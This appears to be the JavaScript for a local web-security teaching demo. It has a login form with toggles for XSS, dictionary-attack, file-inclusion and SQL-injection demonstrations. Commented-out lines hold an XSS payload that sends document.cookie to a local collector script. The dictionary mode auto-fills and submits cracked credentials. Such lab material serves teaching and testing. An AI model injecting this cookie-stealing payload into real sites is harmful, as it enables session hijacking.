$(document).ready(function(){
    $(".dropdown").click(function(){	
        var mdi = $(this).find(".mdi");
    
        if(mdi.hasClass("mdi-menu-down")){
            mdi.removeClass("mdi-menu-down");
            mdi.addClass("mdi-menu-up");
        }
        else{
            mdi.removeClass("mdi-menu-up");
            mdi.addClass("mdi-menu-down");
        }
        $(this).next(".radio-group").slideToggle();
    });

    /* XSS Attack - Put malicious JS in login input 
    $('input[type=radio][name=attack]').change(function() {
        switch(this.value){
            case 'xss-attack' :
                $("#loginWithoutSecurity").val("window.open(\"http://127.0.0.1/securitytesting/xssattack/xss.php?c=\"+document.cookie);");
                break;
        }
    });*/

/* window.location="http://127.0.0.1/securitytesting/xssattack/xss.php?c="+document.cookie; */
    
    $('#cb-dic').change(function() {
        if($(this).is(":checked")){
            $("#passwordWithoutSecurity").addClass("protected");
            checkPasswordValid($("#passwordWithoutSecurity"));
            $("#labelPasswordWithoutSecurity").html("Password - 8 chars & 1 digit & 1 uppercase & 1 lowercase min");
        }
        else{
            $("#passwordWithoutSecurity").removeClass("protected");
            $("#passwordWithoutSecurity").parent().removeClass("has-error");
            $("#submitWithoutSecurity").removeClass("disabled");
            $("#labelPasswordWithoutSecurity").html("Password");
        }
    });
    
    
    /* Handle the event when writting the password */
    $('#passwordWithoutSecurity').keyup(function(){
        checkPasswordValid($(this));
    });
    
    function checkPasswordValid(el){
        if($(el).hasClass("protected")){
            var inputVal = $(el).val();
            //var div = $('#divWithoutSecurity')[0];
            //var regex = /^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,}$/;
            var regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[$@$!%*?&])[A-Za-z\d$@$!%*?&]{8,}$/;
            if(!regex.test(inputVal)) {
                console.log("Not good enough ...");
                $('#divWithoutSecurity').removeClass("has-success");
                $('#divWithoutSecurity').addClass("has-error");
                $('#submitWithoutSecurity').addClass("disabled");
            }else{
                console.log("Good !!!");
                //div.removeClass().addClass("form-group has-success");
                $('#divWithoutSecurity').removeClass("has-error");
                $('#divWithoutSecurity').addClass("has-success");
                $('#submitWithoutSecurity').removeClass("disabled");
            }
        }
    }

    /* clear everything */
    $('#clear').click(function(){

        if (!!$.cookie('username')) {
            $.removeCookie('username', { path: '/' });
        }

        if (!!$.cookie('password')) {
            $.removeCookie('password', { path: '/' });
        }

        $("#display-errors").html("");
        $("#formWithoutSecurity")[0].reset();
    });

});

function submitCheck(){
    if($("#rb-include").is(":checked")){
        window.location = "http://127.0.0.1/securitytesting/?includeattack=1";
        return false;
    }

    if($("#submitWithoutSecurity").hasClass("disabled"))
        return false;
    
    if($("#rb-dictionary").is(":checked")){
        var login = $("#loginWithoutSecurity").val();
        var dataString = 'login='+ login;
        if(login == '')
        {
            $("#display-errors").html("Need a login at least");
            return false;
        }
        else
        {
            $("#display-loader").addClass("loader");
            $.ajax({
                type: "POST",
                url: "dictionaryattack/dictionary.php",
                data: dataString,
                cache: false,
                success: function(result){
                    result = result.split("&*###*&");
                    var data = result[0];
                    var name = result[1];
                    var pass = result[2];
                    $("#display-errors").html(data);
                    $("#loginWithoutSecurity").val(name);
                    $("#passwordWithoutSecurity").val(pass);
                    $("#rb-none").attr("checked", "checked");
                    setTimeout(function(){
                        $("#formWithoutSecurity").submit();
                    }, 2000);
                }
            });
            return false;
        }
    } 
    else {
        var login = $("#loginWithoutSecurity").val();
        var pass = $("#passwordWithoutSecurity").val();
        var prevent_sql = "no";

        if($("#cb-sql").is(':checked')){
            prevent_sql = "yes";
        }
        
        var dataString = 'login='+ login + '&pass='+ pass + '&sql='+ prevent_sql;
        if(login == '' || pass == '')
        {
            $("#display-errors").html("Please fill all fields");
            return false;
        }
        else
        {
            return true;
        }
    }				
}